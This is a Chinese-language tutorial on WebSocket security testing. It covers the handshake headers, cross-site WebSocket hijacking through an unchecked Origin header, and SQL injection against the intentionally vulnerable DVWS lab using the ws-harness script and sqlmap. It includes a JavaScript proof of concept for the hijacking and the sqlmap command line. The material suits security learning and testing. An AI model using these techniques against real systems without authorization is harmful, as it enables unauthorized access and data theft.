介绍


和web数据包相比，在websocket数据包中添加了一些字段，请求包有三个明显字段

Connection

Sec-WebSocket-Version

Sec-WebSocket-Key

返回包中同样也有三个明显字段

Upgrade

Connection

Sec-WebSocket-Accept

例如如下数据包：

GET /?encoding=text HTTP/1.1 Host: echo.websocket.org User-Agent: ... Connection: Upgrade Sec-WebSocket-Version: 13 Origin: http://www.websocket.org Sec-WebSocket-Key: CjYoQD+BXC718rj3aiExxw==
HTTP/1.1 101 Switching Protocols Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Accept: c4RVZSknSoEHizZu6BKl3v+xUuI=

跨域劫持漏洞


例如有如下请求：

GET / HTTP/1.1Host: localhost:8080Origin: http://127.0.0.1:3000Connection: UpgradeUpgrade: websocketSec-WebSocket-Version: 13Sec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw==
我们修改Origin字段
curl -H "Origin: http://www.huasec.com" http://localhost:8080 

发现没有对Origin进行验证，也可以跨域进行协议升级。

漏洞利用

获取到了一个发送评论的请求 （使用BurpSuite->Proxy模块->Websockets History查看，这里是对应的 Direction值为Outgoing为发出的请求，Incoming为发出请求对应的响应信息）

POC:

<script>function ws_attack(){  var ws = new WebSocket("ws://域名:端口/");//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://  ws.onopen = function(evt) {     ws.send("test");  };  ws.onmessage = function(evt) {    ws.close();  };}ws_attack();</script>

这种漏洞也是CSRF的一种。

SQL注入


工具下载：

ws-harness: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web Sockets/Files/ws-harness.py

该案例演示使用SQLMap和我们的WebSocket Harness脚本在WebSocket请求消息中查找SQL注入漏洞。

运行DVWS后，点击 "Error based SQL Injection",此页面会进行WebSocket通信。我们通过BurpSuite拦截浏览器发现了以下消息。

有了这些信息，我们创建WebSocket消息模板，并将WebSocket请求的auth_pass字段使用占位符"[FUZZ]"标记，WebSocket Harness脚本将知道我们希望sqlmap测试WebSocket消息的哪个部分。

接下来，启动WebSocket Harness脚本，并将URL包含在我们想要定位的Web Socket请求中。如下，脚本启动了一个Web服务器，监听8000端口，我们可以在本地（127.0.0.1）使用sqlmap进行攻击

然后可以使用sqlmap指向本地的8000端口，传入名为"fuzz"的GET参数，

sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --tamper=base64encode

在后台，WebSocket Harness会将这些注入内容转换为我们在上面设置的WebSocket消息模板中的"[FUZZ]"占位符。如下所示，sqlmap快速识别出DVWS Web应用程序的"ws://dvws.local:8080/authenticate-user"页面中存在的SQL Injection漏洞。
